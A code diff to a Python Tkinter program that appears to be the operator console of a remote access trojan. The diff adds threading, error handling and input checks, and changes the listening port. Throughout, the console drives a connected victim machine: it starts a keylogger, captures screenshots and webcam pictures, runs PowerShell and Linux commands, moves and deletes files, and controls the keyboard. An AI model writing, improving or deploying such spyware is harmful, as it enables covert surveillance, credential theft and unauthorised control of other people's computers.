@@ -5,6 +5,7 @@ import os
 import subprocess
 import numpy as np
 import cv2
+import random
 from datetime import datetime
 from pynput.keyboard import Listener
 from zlib import decompress
@@ -344,8 +345,6 @@ def changetheme():
 
 
 
-
-
 ################################################ START SERVER #########################################################
 
 def start(PORT):
@@ -366,7 +365,7 @@ def start(PORT):
 
 
 
-def start_server(PORT=5055):
+def start_server(PORT=5064):
 	global server_started,btn_start_text,button_state,display_text
 	stop_text = 'server stopped'
 	if not server_started:
@@ -391,23 +390,36 @@ def start_server(PORT=5055):
 
 
 def send_b_file(path,name,size=1024):
-	disable_buttons()
-	client.send(name.encode('utf-8'))
-	client.recv(1024)
+	try:
+		disable_buttons()
 
-	with open(path,'rb') as f:
-		file_contents = f.read(size)
-		while file_contents:
-			client.send(file_contents)
+		with open(path,'rb') as f:
+			client.send('send binary file'.encode('utf-8'))
+			client.recv(1024)
+			client.send(name.encode('utf-8'))
+			client.recv(1024)
+
 			file_contents = f.read(size)
+			while file_contents:
+				client.send(file_contents)
+				file_contents = f.read(size)
 
-	reconnect()
-	enable_buttons()
+		reconnect()
+		enable_buttons()
+	except Exception as err:
+		enable_buttons()
+		messagebox.showerror('error',err)
+
 
 def recv_b_file(path,name,size=1024):
 	disable_buttons()
 	client.send(path.encode('utf-8'))
-	client.recv(1024)
+	proceed = client.recv(1024).decode('utf-8')
+	if proceed!='ready':
+		messagebox.showerror('error',proceed)
+		enable_buttons()
+		return
+
 
 
 	with open(name,'wb') as f:
@@ -422,24 +434,36 @@ def recv_b_file(path,name,size=1024):
 
 
 def send_t_file(path,name,size=1024):
-	disable_buttons()
-	client.send(name.encode('utf-8'))
-	client.recv(1024)
+	try:
+		disable_buttons()
+		
+		with open(path,'r') as f:
+			client.send('send text file'.encode('utf-8'))
+			client.recv(1024)
+			client.send(name.encode('utf-8'))
+			client.recv(1024)
 
-	with open(path,'r') as f:
-		file_contents = f.read(size)
-		while file_contents:
-			client.send(file_contents.encode('utf-8'))
 			file_contents = f.read(size)
+			while file_contents:
+				client.send(file_contents.encode('utf-8'))
+				file_contents = f.read(size)
 
-	client.send('~~exit~~'.encode('utf-8'))
-	enable_buttons()
+		client.send('~~exit~~'.encode('utf-8'))
+		enable_buttons()
+	except Exception as err:
+		enable_buttons()
+		messagebox.showerror('error',err)
 
 
 def recv_t_file(path,name,size=1024):
 	disable_buttons()
 	client.send(path.encode('utf-8'))
-	client.recv(1024)
+	
+	proceed = client.recv(1024).decode('utf-8')
+	if proceed!='ready':
+		messagebox.showerror('error',proceed)
+		enable_buttons()
+		return
 
 
 	with open(name,'w') as f:
@@ -455,14 +479,15 @@ def recv_t_file(path,name,size=1024):
 
 
 def transfer_data(Type,mode,path,name):
+	if path=='' or name=='':
+		messagebox.showwarning('error','please specify a valid path/name')
+		return
 	display.insert(END,f"\n{Type}ing {path}({'binary' if mode else 'text'})...")
 
 	if Type=='send' and mode is True:
-		client.send('send binary file'.encode('utf-8'))
 		tsb = Thread(target=send_b_file,args=(path,name))
 		tsb.start()
 	elif Type=='send' and mode is False:
-		client.send('send text file'.encode('utf-8'))
 		tst = Thread(target=send_t_file,args=(path,name))
 		tst.start()
 	elif Type=='recv' and mode is True:
@@ -478,23 +503,29 @@ def transfer_data(Type,mode,path,name):
 
 
 def extract(path,name):
+	if path=='' or name=='':
+		messagebox.showwarning('error','please specify a valid path/name')
+		return
 	client.send('extract zip'.encode('utf-8'))
 	client.recv(1024)
 	client.send(path.encode('utf-8'))
 	client.recv(1024)
 	client.send(name.encode('utf-8'))
 	text = f'\nextracted {path} to {name}'
-	display.insert(END,text)
+	display.insert(END,text+line_breaker)
 
 def archive(path,name):
+	if path=='' or name=='':
+		messagebox.showwarning('error','please specify a valid path/name')
+		return
 	client.send('archive directory'.encode('utf-8'))
 	client.recv(1024)
 	client.send(path.encode('utf-8'))
 	client.recv(1024)
 	client.send(name.encode('utf-8'))
 
-	text = f'\narchived {path} to {name}.zip'
-	display.insert(END,text)
+	text = f'\narchived {path} to {name}'
+	display.insert(END,text+line_breaker)
 
 
 def stream():
@@ -503,6 +534,9 @@ def stream():
 
 
 def update_dir(Type,name):
+	if name=='':
+		messagebox.showwarning('error','please specify a valid path/name')
+		return
 	if Type=='make folder':
 		client.send('make directory'.encode('utf-8'))
 		client.recv(1024)
@@ -513,19 +547,37 @@ def update_dir(Type,name):
 		client.send('remove directory'.encode('utf-8'))
 		client.recv(1024)
 		client.send(name.encode('utf-8'))
-		display.insert(END,'\nremoved directory succesfully!\n'+line_breaker)
+		result = client.recv(1024).decode('utf-8')
+		if result=='success':
+			display.insert(END,'\nremoved directory succesfully!\n'+line_breaker)
+		else:
+			messagebox.showerror('error',result)
 
 	elif Type=='remove file':
 		client.send('remove file'.encode('utf-8'))
 		client.recv(1024)
 		client.send(name.encode('utf-8'))
-		display.insert(END,'\nremoved file succesfully!\n'+line_breaker)
+		result = client.recv(1024).decode('utf-8')
+		if result=='success':
+			display.insert(END,'\nremoved file succesfully!\n'+line_breaker)
+		else:
+			messagebox.showerror('error',result)
 
 def openf(path):
+	if path=='':
+		messagebox.showwarning('error','please specify a valid path/name')
+		return
+	disable_buttons()
 	client.send('open'.encode('utf-8'))
 	client.recv(1024)
 	client.send(path.encode('utf-8'))
-	display.insert(END,f'\nopened {os.path.basename(path)}{line_breaker}')
+	result = client.recv(1024).decode('utf-8')
+	if result=='success':
+		display.insert(END,f'\nopened {os.path.basename(path)}{line_breaker}')
+	else:
+		messagebox.showerror('error',result)
+	enable_buttons()
+	
 
 def change_directory(path):
 	client.send(('cd '+path).encode('utf-8'))
@@ -548,6 +600,7 @@ def printdir():
 	display.insert(END,'\n'+line_breaker)
 
 def execute_powershell(command):
+	disable_buttons()
 	client.send('powershell'.encode('utf-8'))
 	client.recv(1024)
 	client.send(command.encode('utf-8'))
@@ -558,6 +611,7 @@ def execute_powershell(command):
 		result = client.recv(1024).decode('utf-8')
 	else:
 		display.insert(END,result.replace('~~exit~~','')+line_breaker)
+	enable_buttons()
 
 def start_kl():
 	client.send('start keylogger'.encode('utf-8'))
@@ -616,8 +670,9 @@ def persist_display():
 
 
 
-def screenshot(): #this image is just a dummy image,replace it!
+def screenshot():
 	global image,image_r
+	disable_buttons()
 	size = 1024
 
 	client.send('screenshot'.encode('utf-8'))
@@ -641,6 +696,7 @@ def screenshot(): #this image is just a dummy image,replace it!
 			file_contents = client.recv(size)
 
 	reconnect()
+	enable_buttons()
 
 
 	width,height = pyautogui.size()
@@ -654,7 +710,8 @@ def screenshot(): #this image is just a dummy image,replace it!
 	btn_fullscreen.pack(fil=BOTH,expand=True)
 
 
-def take_picture(): #this image is just a dummy image,replace it!
+def take_picture(): 
+	disable_buttons()
 	global image_i,image_c
 	size = 1024
 
@@ -679,6 +736,7 @@ def take_picture(): #this image is just a dummy image,replace it!
 			file_contents = client.recv(size)
 
 	reconnect()
+	enable_buttons()
 
 
 	width,height = pyautogui.size()
@@ -748,7 +806,7 @@ def transfer_file(Type):
 def extract_zip():
 	state = True
 	text = '\n\nextract zip - option selected\n1)enter the path of the zip file\n2)enter the name for the directory for the zip to be extracted in'
-	display.insert(END,text)
+	display.insert(END,line_breaker+text)
 	widgetdestroyer(controlls_frame)
 
 
@@ -770,7 +828,7 @@ def extract_zip():
 def archive_dir():
 	state = True
 	text = '\n\narchive directory - option selected\n1)enter the path of the directory\n2)enter the name for the zipfile'
-	display.insert(END,text)
+	display.insert(END,line_breaker+text)
 	widgetdestroyer(controlls_frame)
 
 
@@ -809,7 +867,7 @@ def open_file():
 	label_path = Label(controlls_frame,text='path :',**kwargs)
 	entry_path = Entry(controlls_frame,width=50,**kwargs)
 
-	btn_open = Button(controlls_frame,text='open',bg=bg,fg=fg,font=font_16,command=lambda:openf(entry_path.get()))
+	btn_open = Button(controlls_frame,text='open',bg=bg,fg=fg,font=font_16,command=lambda:Thread(target=openf,args=(entry_path.get(),)).start())
 
 
 	label_path.grid(row=1,column=0, sticky='NSW')
@@ -845,7 +903,7 @@ def powershell():
 	label_command = Label(controlls_frame,text='command :',**kwargs)
 	entry_command = Entry(controlls_frame,width=50,**kwargs)
 
-	btn_exc = Button(controlls_frame,text='execute',bg=bg,fg=fg,font=font_16,command=lambda:execute_powershell(entry_command.get()))
+	btn_exc = Button(controlls_frame,text='execute',bg=bg,fg=fg,font=font_16,command=lambda:Thread(target=execute_powershell,args=(entry_command.get(),)).start())
 
 
 	label_command.grid(row=1,column=0, sticky='NSW')
@@ -989,7 +1047,7 @@ def popup():
 
 def screen(display_frame):
 	scroll_bar = Scrollbar(display_frame,bg=display_color)
-	display = Text(display_frame,fg=text_color,bg=display_color,wrap='none',bd=bd,height=32,
+	display = Text(display_frame,fg=text_color,bg=display_color,wrap='none',bd=0,height=32,
 		selectforeground=tsfg,selectbackground=tsbg,yscrollcommand=scroll_bar.set)
 	scroll_bar.config(command=display.yview)
 
@@ -1010,8 +1068,8 @@ def home(root):
 	#Defining frames to organise widgets
 	root_pannel      = PanedWindow()
 	controlls_pannel = PanedWindow(root_pannel,orient=VERTICAL)
-	frame_buttons    = Frame(root_pannel,bg=bg)
-	display_frame    = Frame(controlls_pannel,bg=bg)
+	frame_buttons    = LabelFrame(root_pannel,bg=bg)
+	display_frame    = LabelFrame(controlls_pannel,bg=bg)
 	controlls_frame  = LabelFrame(controlls_pannel,bg=bg)
 
 	left_buttons  = Frame(frame_buttons,bg=bg)
@@ -1037,6 +1095,7 @@ def home(root):
 	display,scroll_bar = screen(display_frame)
 	display.config(height=32,width=80)
 	display.insert(END,display_text)
+	#header('192.168.18.3',5050)
 
 
 	#adding buttons
@@ -1046,7 +1105,7 @@ def home(root):
 	btn_linux      = Button(left_buttons,state=button_state,text='linux commands',command=lambda:linux(),**kwargs)
 	btn_popup      = Button(left_buttons,state=button_state,text='popup',command=lambda:popup(),**kwargs)
 	btn_send_file  = Button(left_buttons,state=button_state,text='send a file',command=lambda:transfer_file('send'),**kwargs)
-	btn_screenshot = Button(left_buttons,state=button_state,text='take screenshot',command=lambda:screenshot(),**kwargs)
+	btn_screenshot = Button(left_buttons,state=button_state,text='take screenshot',command=lambda:Thread(target=screenshot).start(),**kwargs)
 	btn_extract_zip       = Button(left_buttons,state=button_state,text='extract a zip',command=lambda:extract_zip(),**kwargs)
 	btn_keyboard_controll = Button(left_buttons,state=button_state,text='keyboard access',command=lambda:keyboard(),**kwargs)
 
@@ -1058,7 +1117,7 @@ def home(root):
 	btn_recv_file   = Button(right_buttons,state=button_state,text='recieve a file',command=lambda:transfer_file('recv'),**kwargs)
 	btn_keylogger   = Button(right_buttons,state=button_state,text='keylogger',command=keylogger,**kwargs)
 	btn_powershell  = Button(right_buttons,state=button_state,text='powershell',command=lambda:powershell(),**kwargs)
-	btn_takepicture = Button(right_buttons,state=button_state,text='take picture',command=lambda:take_picture(),**kwargs)
+	btn_takepicture = Button(right_buttons,state=button_state,text='take picture',command=lambda:Thread(target=take_picture).start(),**kwargs)
 
 
 	#dashboard buttons
